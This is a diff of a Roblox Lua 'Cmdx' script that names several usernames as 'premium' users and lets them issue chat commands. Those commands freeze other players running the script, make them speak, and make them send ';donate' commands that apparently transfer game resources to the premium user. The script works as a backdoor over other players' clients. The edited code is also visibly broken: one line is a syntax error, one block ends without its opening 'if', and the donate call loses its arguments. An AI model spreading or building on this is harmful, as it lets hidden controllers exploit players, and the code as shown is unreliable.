@@ -1,10 +1,10 @@
 --// Cmdx User //--
-local user_premium__001 = game.Players:FindFirstChild("FlavorgamerYT")
-local user_premium__002 = game.Players:FindFirstChild("adam1102928181")
+local user_premium__001 = game.Players:FindFirstChild("adam1102928181")
+local user_premium__002 = game.Players:FindFirstChild("LittleJonib")
 local user_premium__003 = game.Players:FindFirstChild("xylar103")
 local user_premium__004 = game.Players:FindFirstChild("whoareyiu24")
 local player = game.Players.LocalPlayer
-
+local chat = game:GetService("TextChatService").TextChannels.RBXSystem
 --// Commands //--
 local freeze = function()
     if player.Character then
@@ -88,19 +88,18 @@ local function handleChatCommands(premiumUser)
                     end
                 end
             elseif cht:match(".enlighten .") then
-                if player ~= premiumUser then
-                    player.Backpack:FindFirstChild("The Arkenstone"):Equip()
-                    game.Players:Chat(";enlighten " .. premiumUser.Name)
+                
+                    chat:SendAsync(";enlighten" .. premiumUser.Name)
                 end
             elseif cht:match(".donate .") then
                 local text = cht:match(".donate (.+)") -- Extract text
                 if player ~= premiumUser then
-                    game.Players:Chat(";donate " .. text .. " " .. premiumUser.Name)
+                    chat:SendAsync(";donate"  )
                 end
             elseif cht:match(".say .") then
                 local text = cht:match(".say (.+)") -- Extract text
                 if player ~= premiumUser then
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
+chat:SendAsync(.. text .. " " )
                 end
             elseif cht:match("^%.cmd .+") then
                 local text = cht:match("^%.cmd (.+)") -- Extract text after ".cmd "
